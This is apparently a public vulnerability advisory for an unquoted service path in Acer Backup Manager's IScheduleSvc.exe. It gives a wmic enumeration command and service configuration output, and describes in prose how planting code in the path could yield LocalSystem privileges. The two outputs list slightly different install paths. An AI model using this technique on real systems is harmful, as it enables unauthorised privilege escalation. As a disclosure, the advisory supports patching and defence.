EXP
---

    # Exploit Title: Acer Backup Manager Module 3.0.0.99 - 'IScheduleSvc.exe'  Unquoted Service Path
    # Discovery by: Emmanuel Lujan
    # Discovery Date: 2021-05-19
    # Vendor Homepage: https://www.acer.com/ac/en/US/content/home
    # Tested Version: 3.0.0.99
    # Vulnerability Type: Unquoted Service Path
    # Tested on OS: Windows 7 Home Premium x64

    # Step to discover Unquoted Service Path:

    C:\>wmic service get name, pathname, displayname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

    NTI IScheduleSvc                                                        NTI ISch
    eduleSvc                              C:\Program Files (x86)\NTI\Acer Backup Man
    ager\IScheduleSvc.exe                                     Auto


    # Service info:

    C:\>sc qc "NTI IScheduleSvc"
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: NTI IScheduleSvc
            TYPE               : 110  WIN32_OWN_PROCESS <interactive>
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files (x86)\Acer Backup Manager\IScheduleSvc.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : NTI IScheduleSvc
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem

    #Exploit:

    A successful attempt would require the local user to be able to insert their code in the system root path undetected by the OS or other
     security applications where it could potentially be executed during application startup or reboot. If successful, the local user's
    code would execute with the elevated privileges of the application.